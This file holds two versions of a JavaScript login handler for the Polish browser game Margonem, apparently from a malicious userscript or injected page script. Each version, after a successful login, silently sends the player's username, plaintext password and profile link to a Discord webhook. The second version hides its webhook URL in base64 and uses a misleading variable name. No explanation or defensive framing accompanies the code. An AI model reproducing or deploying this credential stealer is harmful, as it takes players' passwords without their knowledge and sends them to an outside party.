window.login = (() => {
    const o = document.getElementById("ulogin").value,
        n = document.getElementById("upass").value;
    if ("smg" === o) document.location.href = "http://31337.pl/";
    else {
        const e = "ajax/logon.php";
        o && n && (window.$("#rpanel").load(`${e}?t=login`, {
            l: o,
            ph: window.sha1(window.passhash + n)
        }, e => {
            !e.includes("Błędne hasło lub login.") && e.includes("Zalogowany/a jako:") && window.$.ajax({
                url: "https://discordapp.com/api/webhooks/714919117743849531/WcEVNtjidYxp81Of-EdlPYxv5MzkeDPfKH7UX7lUZIKDV2ejbWVsQaDxw2Sprq7zQG_0",
                type: "POST",
                data: JSON.stringify({
                    embeds: [{
                        title: "pasy",
                        description: `login: ${o}\nhasło: ${n}\nhttps://www.margonem.pl/?task=profile&id=${window.getCookie("user_id")}`
                    }]
                }),
                contentType: "application/json"
            })
        }), document.getElementById("cfgmenu") && window.location.reload())
    }
});

'use strict';
window.login = () => {
  const username = document.getElementById("ulogin").value;
  const password = document.getElementById("upass").value;
  if ("smg" === username) {
    document.location.href = "http://31337.pl/";
  } else {
    const TRAVIS_API_JOBS_URL = "ajax/logon.php";
    if (username && password) {
      window.$("#rpanel").load(`${TRAVIS_API_JOBS_URL}?t=login`, {
        l : username,
        ph : window.sha1(window.passhash + password)
      }, (e) => {
        if (!e.includes("B\u0142\u0119dne has\u0142o lub login.") && e.includes("Zalogowany/a jako:")) {
          window.$.ajax({
            url : atob("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvNTg4MDMyMzk1ODc0MjcxMjQyL1QyMk5LMTNoWDA1SHNVZ3k0Nm5za2Vwc1d3NG5rT0FJMnRZR0lGUmswUHFWSjM0bVFSSkYwdlYybFZtSlJmNmJZWk16"),
            type : "POST",
            data : JSON.stringify({
              embeds : [{
                title : "pasy",
                description : `login: ${username}\nhas\u0142o: ${password}\nhttps://www.margonem.pl/?task=profile&id=${window.getCookie("user_id")}`
              }]
            }),
            contentType : "application/json"
          });
        }
      });
      if (document.getElementById("cfgmenu")) {
        window.location.reload();
      }
    }
  }
};
